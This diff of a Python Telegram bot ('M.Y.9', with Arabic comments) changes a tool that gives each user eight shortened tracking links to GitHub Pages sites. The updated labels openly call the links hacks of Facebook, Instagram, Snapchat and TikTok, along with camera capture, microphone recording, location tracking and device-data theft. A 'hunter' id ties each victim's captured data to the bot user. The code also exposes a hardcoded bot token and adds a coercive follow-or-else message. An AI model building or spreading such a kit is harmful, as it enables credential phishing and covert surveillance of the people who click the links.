@@ -6,14 +6,14 @@ import os
 import logging
 import time
 
-# كتم التنبيهات الحمراء المزعجة
+# منع التنبيهات المزعجة
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
 app = Flask('')
 @app.route('/')
 def home():
-    return "M.Y.9 System is Online"
+    return "M.Y.9 System Online"
 
 def run():
     port = int(os.environ.get('PORT', 8080))
@@ -27,7 +27,7 @@ def keep_alive():
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
 
-# حل مشكلة الـ Conflict 409 وتنظيف الـ Webhook
+# حل مشكلة الـ Conflict 409
 bot.remove_webhook()
 time.sleep(1)
 
@@ -46,42 +46,55 @@ def send_welcome(message):
     
     # رابط الـ GitHub Pages الأساسي تبعك
     base = "https://m-y-9-tech.github.io/fb/" 
-    
-    # الروابط الـ 8 المطلوبة بلمسة جيل 2009
-    links = {
-        "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}"),
-        "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}"),
-        "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}"),
-        "tik": short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}"),
-        "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}"),
-        "mic": short_link(f"{base}mic.html?id={uid}&hunter={hunter}"),
-        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}"),
-        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
-    }
 
+    # تجهيز الروابط الـ 8 بشكل منفصل
+    fb_link = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
+    ig_link = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
+    snap_link = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
+    tik_link = short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}")
+    cam_link = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
+    mic_link = short_link(f"{base}mic.html?id={uid}&hunter={hunter}")
+    loc_link = short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
+    sys_link = short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
+
+    # الرسالة بنفس التنسيق اللي طلبته بالضبط
     msg = f"""
-🚀 نـ^ـظـ^ـام M.Y.9 الـ^ـمـ^ـطـ^ـور | أهلاً بك {first_name}
+نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
 
-👤 Dev: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
-🔴 Instagram: https://www.instagram.com/m_y_.9/?hl=ar#
+👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
+
+⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
+عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـقـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.
+
+🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
+https://www.instagram.com/m_y_.9/?hl=ar#
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-💎 الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة (جيل 2009) 💎
+💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-🔹 فيـ^ـسبـ^ـوك 🔐: `{links['fb']}`
-🔹 انـ^ـستـ^ـقـ^ـرام 🛡️: `{links['ig']}`
-🔹 سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
-🔹 تـيـك تـوك 🎵: `{links['tik']}`
-🔹 الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
-🔹 تـسـجـيـل الـصـوت 🎤: `{links['mic']}`
-🔹 تـحـديـد المـ^ـوقـ^ـع 📍: `{links['loc']}`
-🔹 مـ^ـعـ^ـلـ^ـومـ^ـات الـ^ـجـ^ـهـ^ـاز 📱: `{links['sys']}`
+
+🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb_link}`
+
+🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig_link}`
+
+🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap_link}`
+
+🔹 اختـ^ـراق تـيـك تـوك 🎵: `{tik_link}`
+
+🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{cam_link}`
+
+🔹 تـسـجـيـل الـصـوت 🎤: `{mic_link}`
+
+🔹 تـحـديـد المـ^ـوقـ^ـع 📍: `{loc_link}`
+
+🔹 سـحـب مـعـلـومـات الـنـظـام 📱: `{sys_link}`
+
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل..
+⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
     """
     bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)
 
 if __name__ == "__main__":
     keep_alive()
-    print("🚀 M.Y.9 System is LIVE now!")
-    bot.infinity_polling(timeout=20, long_polling_timeout=10)
+    print("🚀 M.Y.9 System Started Successfully!")
+    bot.infinity_polling()
